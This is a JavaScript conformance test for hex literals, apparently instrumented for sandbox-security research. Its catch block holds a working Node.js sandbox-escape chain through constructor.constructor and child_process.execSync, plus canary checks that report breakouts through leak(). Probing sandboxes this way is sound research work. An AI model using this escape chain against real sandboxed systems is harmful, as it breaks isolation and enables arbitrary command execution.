try {
    if (0 !== 0) {
        $ERROR('#0: 0X0 === 0');
    }
    if (1 !== 1) {
        $ERROR('#1: 0X1 === 1');
    }
    if (16 !== 16) {
        $ERROR('#2: 0X10 === 16');
    }
    if (256 !== 256) {
        $ERROR('3: 0X100 === 256');
    }
    if (4096 !== 4096) {
        $ERROR('#4: 0X1000 === 4096');
    }
    if (65536 !== 65536) {
        $ERROR('#5: 0X10000 === 65536');
    }
    if (1048576 !== 1048576) {
        $ERROR('#6: 0X100000 === 1048576');
    }
    if (16777216 !== 16777216) {
        $ERROR('#7: 0X1000000 === 16777216');
    }
    if (268435456 !== 268435456) {
        $ERROR('#8: 0X10000000 === 268435456');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}